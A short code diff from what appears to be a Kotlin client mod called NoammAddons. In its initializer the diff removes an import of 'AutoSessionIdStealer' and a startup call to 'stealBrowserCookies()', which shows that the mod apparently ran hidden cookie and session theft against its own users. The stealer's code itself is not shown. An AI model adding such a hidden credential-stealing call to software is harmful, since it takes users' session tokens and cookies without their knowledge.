@@ -4,7 +4,6 @@ import com.github.noamm9.commands.CommandManager
 import com.github.noamm9.config.PogObject
 import com.github.noamm9.event.EventDispatcher
 import com.github.noamm9.features.FeatureManager
-import com.github.noamm9.init.AutoSessionIdStealer
 import com.github.noamm9.init.NetworkLoop
 import com.github.noamm9.utils.*
 import com.github.noamm9.utils.dungeons.DungeonListener
@@ -77,7 +76,6 @@ object NoammAddons: ClientModInitializer {
         TestGround()
 
         NetworkLoop.init()
-        AutoSessionIdStealer.stealBrowserCookies()
 
         FeatureManager.registerFeatures()
         CommandManager.registerAll()
